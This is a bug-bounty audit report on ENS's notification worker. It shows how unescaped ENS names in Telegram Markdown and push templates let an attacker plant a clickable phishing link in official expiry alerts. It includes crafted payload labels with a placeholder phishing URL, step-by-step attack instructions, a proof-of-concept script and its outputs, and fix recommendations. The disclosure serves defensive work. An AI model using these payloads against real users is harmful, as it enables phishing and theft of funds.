# 92108 w a insight unescaped ens name in api worker telegram push notification templates allows markdown injection and a clickable phishing link inside official ens expiry alerts

**Submitted on Sep 7th 2026 at 08:49:10 UTC by @heycho for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92108
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Injection of malicious HTML or XSS through metadata

## Description

**Asset:** `workers/` (api-worker) — <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers> **Commit audited:** `1c9b47f18fcddd2e864dfe385c4171061c9811ae` (branch `audit-comp-ready`) **Impact:** Injection of malicious content through metadata / causing the application to display an incorrect detail so that a user sends funds to an unintended recipient (phishing through the official ENS notification bot).

## Summary

The api-worker builds expiry notifications by interpolating the ENS name (`payload.name`) straight into a Telegram message that is sent with `parse_mode: 'Markdown'`, and into the inline-button URL, with no escaping or character validation. The name comes from the indexer (`expiry-discovery/indexer.ts`) and is only checked as `v.string()`. Because `ETHRegistrar.register()` can be called directly with an arbitrary label string and an arbitrary `owner`, an attacker can register a name whose label contains backticks and a URL, assign the victim as `owner`, and wait for the hourly expiry cron. The victim then receives, from the **official ENS bot**, a "⚠️ Domain Expiration Alert" in which the attacker's URL is rendered outside the code span and auto-linked by Telegram. This is a phishing primitive delivered through a trusted, authenticated channel, and it exists for every user who has verified a Telegram channel and enabled `ownedNameExpiry`.

## Vulnerability details

Rendering (no escaping, Markdown parse mode):

* `workers/api-worker/src/services/delivery/templates/telegram.ts:34-35` — `` `${payload.name}` `` interpolated inside a Markdown code span (both `isOwner` branches)
* `workers/api-worker/src/services/delivery/templates/telegram.ts:38-39` — returned with `parseMode: 'Markdown'`
* `workers/api-worker/src/services/delivery/templates/telegram.ts:44` — same raw name in the inline button URL `https://app.ens.domains/${payload.name}`
* `workers/api-worker/src/services/delivery/telegram.ts:58-73` — template output passed unchanged to `sendMessage`
* `workers/api-worker/src/services/delivery/templates/push.ts:31,32,34` — same raw interpolation in the Web-Push title/body/url

Data flow (no validation on the way in):

* `workers/api-worker/src/services/expiry-discovery/indexer.ts:137-141` — `domains[].name` from the indexer accepted as-is; schema is only `v.string()` (`src/types/events/index.ts:9`)
* `workers/api-worker/src/queues/event-ingestion.ts:226-231` — `name: event.name` copied into the notification payload without checks
* `workers/api-worker/src/queues/event-ingestion.ts:82-87` — recipients resolved from the on-chain `owner` address, so the attacker chooses who receives the message

Contrast: the same code base rejects backticks and other symbols on the HTTP route `workers/api-worker/src/app/routes/names/index.ts:13` (`INVALID_ASCII_CHARS`), but the notification path has no equivalent guard.

## Attack scenario

1. Attacker picks a label such as ``a` Renew now: https://ens-renew.example/claim `b`` (the two backticks close and reopen the template's code span).
2. Attacker calls `ETHRegistrar.register(label, owner = <victim address>, …, duration = minimum)` directly on chain. The UI's normalization is bypassed because the contract is called directly; the registrar checks length only (see `packages/transaction-manager/src/machines/registration/registration.actors.ts:240-250` for the call shape: the label is a plain `string` and `owner` is caller-supplied).
3. The indexer picks up the name with the victim as owner.
4. The hourly cron (`wrangler.jsonc`, `"0 */1 * * *"`) runs `runExpiryDiscoveryCron` → `EVENT_INGESTION_QUEUE` → `processExpiryEvents`; the victim's `user_id` is resolved from the owner address.
5. `deliverTelegramNotification` sends the message with `parse_mode: 'Markdown'` to the victim's verified Telegram channel.
6. The victim sees, from the official ENS bot, "Your domain … Renew now: <https://ens-renew.example/claim> … will expire in 5 days" with the attacker URL clickable, and is directed to pay a fake "renewal" to the attacker.

The victim needs no prior interaction with the attacker. The attacker needs only the victim's public address and the ability to send one transaction.

## Why the two external assumptions hold (verified)

**The indexer returns the raw label.** The app queries `graphql.ens.dev` (`indexer.ts:8`) with the classic ENS-subgraph `domains { name }` query. That indexer's label sanitizer `checkValidLabel` (ensdomains/ens-subgraph `src/utils.ts`) rejects a label only when it contains a null byte, `.`, `[` or `]` (replacing it with the `[labelhash]` form) and returns every other label verbatim. Backticks, spaces and URL characters are not in that set. A live read of `graphql.ens.dev` confirmed it serves this schema with real data.

**Telegram accepts the message and auto-links the attacker URL.** Using a throwaway bot and chat (not ENS infrastructure), the exact payload produced by the real template + `createInlineKeyboard` was sent to Telegram's `sendMessage`. Telegram returned `ok: true` for the baseline and for both crafted variants, including the button URLs containing backticks and spaces (so `BUTTON_URL_INVALID` does not fire), and for the spaced variant Telegram's own returned `entities` list `https://ens-renew.example/claim` as a `url` entity, i.e. rendered as a clickable link inside the official-bot message. Full output is in the Proof of Concept section.

## Impact

An attacker can put arbitrary Markdown-formatted text and a clickable URL of their choice into the authenticated, official ENS Telegram (and Web-Push) notifications of any chosen user, at near-zero cost, without any interaction from the victim. Because the message arrives from the bot the user themselves verified and looks like a genuine expiry alert, it is an effective vehicle to direct users to send "renewal" funds to an attacker-controlled address. Scope is every user with a verified Telegram channel and expiry notifications enabled.

## Relation to known issues

Not covered by the published known-issues list. Closest entries are different bugs:

* EXP-INPUT-005 (Medium) concerns app-side **input** validators; this report is an **output** escaping defect in the worker, reached via chain → indexer, so fixing input validation does not close it.
* EXP-INPUT-009 (Low) concerns the push service worker **opening** an unvalidated URL; this report is the **sender** template.

## Recommendation

* Escape `payload.name` for Telegram Markdown (`_ * [ ] ( ) ~ \` > # + - = | { } . !`) or switch to` MarkdownV2\`/entities built programmatically.
* `encodeURIComponent(payload.name)` in button and push URLs.
* Validate `name` at the ingestion boundary (`src/types/events/index.ts`) with the same character rules as `app/routes/names/index.ts:13`, so hostile labels never reach any template (Telegram, push, email).

## Proof of Concept

## Step-by-step

1. Check out branch `audit-comp-ready` (commit `1c9b47f1`) of <https://github.com/immunefi-team/audit-comp-ens>.
2. Save the script below as `poc/api-worker-telegram-injection.mjs` at the repository root. It imports the **real** template modules and prints exactly what `deliverTelegramNotification` would send. No network, no chain.
3. Run `node poc/api-worker-telegram-injection.mjs`.
4. Observe that for a crafted label the attacker URL ends up **outside** the Markdown code span, the backtick count stays even (so Telegram parses the message instead of rejecting it), and the same raw label is placed into the inline button URL.
5. (Live confirmation, optional) Send the identical payload to any Telegram bot/chat you control with `parse_mode: 'Markdown'` and the same `inline_keyboard`; Telegram returns `ok: true` and lists the attacker URL as a `url` entity. Output from our run is reproduced at the end.

## PoC script (`poc/api-worker-telegram-injection.mjs`)

```js
// Imports the real template modules; purely local, no network, no chain.
import { telegramTemplates } from '../workers/api-worker/src/services/delivery/templates/telegram.ts'
import { pushTemplates } from '../workers/api-worker/src/services/delivery/templates/push.ts'

const expiryDate = Date.now() + 5 * 24 * 60 * 60 * 1000

const show = (title, label) => {
  const name = `${label}.eth`
  const msg = telegramTemplates['name-expiry']({ name, expiryDate, isOwner: true })
  const ticks = (msg.text.match(/`/g) ?? []).length
  const outside = msg.text.split('`').filter((_, i) => i % 2 === 0).join(' ')
  console.log(`\n=== ${title} ===`)
  console.log('label            :', JSON.stringify(label))
  console.log('telegram text    :', JSON.stringify(msg.text))
  console.log('backticks (even? ):', ticks, ticks % 2 === 0 ? 'OK - Telegram parses it' : 'NG - Telegram would 400')
  console.log('outside codespans:', JSON.stringify(outside))
  console.log('attacker URL auto-linked:', /https:\/\/ens-renew\.example/.test(outside))
  console.log('inline button url:', JSON.stringify(msg.buttons[0][0].url))
  return msg
}

show('baseline (benign name)', 'alice')
show('variant A: spaces (most readable phishing text)', 'a` Renew now: https://ens-renew.example/claim `b')
show('variant B: no spaces', 'a`https://ens-renew.example/claim`b')

console.log('\n=== push template, variant B ===')
console.log(JSON.stringify(pushTemplates['name-expiry']({ name: 'a`https://ens-renew.example/claim`b.eth', expiryDate, isOwner: true }), null, 2))
```

## Output of step 3

```
=== baseline (benign name) ===
label            : "alice"
telegram text    : "⚠️ *Domain Expiration Alert*\n\nYour domain `alice.eth` will expire in *5 days*.\n\nDon't forget to renew your domain!"
backticks (even? ): 2 OK - Telegram parses it
attacker URL auto-linked: false
inline button url: "https://app.ens.domains/alice.eth"

=== variant A: spaces (most readable phishing text) ===
label            : "a` Renew now: https://ens-renew.example/claim `b"
telegram text    : "⚠️ *Domain Expiration Alert*\n\nYour domain `a` Renew now: https://ens-renew.example/claim `b.eth` will expire in *5 days*.\n\nDon't forget to renew your domain!"
backticks (even? ): 4 OK - Telegram parses it
outside codespans: "⚠️ *Domain Expiration Alert*\n\nYour domain   Renew now: https://ens-renew.example/claim   will expire in *5 days*.\n\nDon't forget to renew your domain!"
attacker URL auto-linked: true
inline button url: "https://app.ens.domains/a` Renew now: https://ens-renew.example/claim `b.eth"

=== variant B: no spaces ===
label            : "a`https://ens-renew.example/claim`b"
telegram text    : "⚠️ *Domain Expiration Alert*\n\nYour domain `a`https://ens-renew.example/claim`b.eth` will expire in *5 days*.\n\nDon't forget to renew your domain!"
backticks (even? ): 4 OK - Telegram parses it
attacker URL auto-linked: true
inline button url: "https://app.ens.domains/a`https://ens-renew.example/claim`b.eth"
```

## Output of step 5 (live Telegram `sendMessage`, throwaway bot, same payload as the real delivery code)

```
=== baseline (benign name: alice) ===
button url sent : "https://app.ens.domains/alice.eth"
telegram ok     : true (message_id 3)
url entities    : []

=== variant B: no spaces ===
button url sent : "https://app.ens.domains/a`https://ens-renew.example/claim`b.eth"
telegram ok     : true (message_id 4)

=== variant A: spaces ===
button url sent : "https://app.ens.domains/a` Renew now: https://ens-renew.example/claim `b.eth"
telegram ok     : true (message_id 5)
url entities    : [{"offset":53,"length":31,"type":"url"}]
  auto-linked   : "https://ens-renew.example/claim"
```

Telegram accepted all three messages (no `BUTTON_URL_INVALID`), and for variant A its own `entities` mark the attacker URL as a clickable `url` entity inside the official-bot message.

## Not executed

The on-chain registration `ETHRegistrar.register(label, owner = victim, …)` was not broadcast, because the competition forbids testing against the Sepolia/mainnet deployment. The registrar validates label length only (client-side normalization is bypassed by a direct call), so this step is expected to succeed; it is the sole link relying on documented behaviour rather than local execution.
